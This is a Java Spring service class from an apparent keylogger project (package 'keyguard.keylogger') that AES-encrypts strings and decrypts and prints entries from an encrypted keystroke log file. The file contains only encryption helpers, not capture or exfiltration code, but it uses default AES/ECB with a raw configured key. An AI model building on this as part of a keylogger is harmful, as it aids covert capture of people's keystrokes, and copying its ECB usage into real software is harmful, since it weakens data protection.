package com.keyguard.javakeyguard.keylogger.encryption;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.keyguard.javakeyguard.model.EncryptedLogEntry;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.stream.Stream;

@Service
public class EncryptionService {

    @Value("${encryption.secret}")
    private String secret;

    private static final String ALGORITHM = "AES";

    private SecretKeySpec getKey() {
        return new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), ALGORITHM);
    }

    public String encrypt(String plainText) {
        if (plainText == null) return "";
        try {
            Cipher cipher = Cipher.getInstance(ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, getKey());
            return Base64.getEncoder().encodeToString(cipher.doFinal(plainText.getBytes(StandardCharsets.UTF_8)));
        } catch (Exception e) {
            throw new RuntimeException("Encryption failed", e);
        }
    }

    public String decrypt(String encryptedText) {
        if (encryptedText == null) return "";
        try {
            Cipher cipher = Cipher.getInstance(ALGORITHM);
            cipher.init(Cipher.DECRYPT_MODE, getKey());
            return new String(cipher.doFinal(Base64.getDecoder().decode(encryptedText)), StandardCharsets.UTF_8);
        } catch (Exception e) {
            throw new RuntimeException("Decryption failed", e);
        }
    }

    public void printDecryptedLogFile(String logFilePath) {
        Path path = Path.of(logFilePath);
        if (!Files.exists(path)) {
            return;
        }

        ObjectMapper objectMapper = new ObjectMapper();

        try (Stream<String> lines = Files.lines(path)) {
            lines.filter(line -> !line.isBlank())
                    .forEach(line -> {
                        try {
                            EncryptedLogEntry entry = objectMapper.readValue(line, EncryptedLogEntry.class);
                            System.out.printf("%s -> %s%n",
                                    decrypt(entry.getEncryptedContext()),
                                    decrypt(entry.getEncryptedPayload()));
                        } catch (Exception e) {
                            System.err.println("Error parsing log line: " + e.getMessage());
                        }
                    });
        } catch (Exception e) {
            throw new RuntimeException("Failed to read log file", e);
        }
    }
}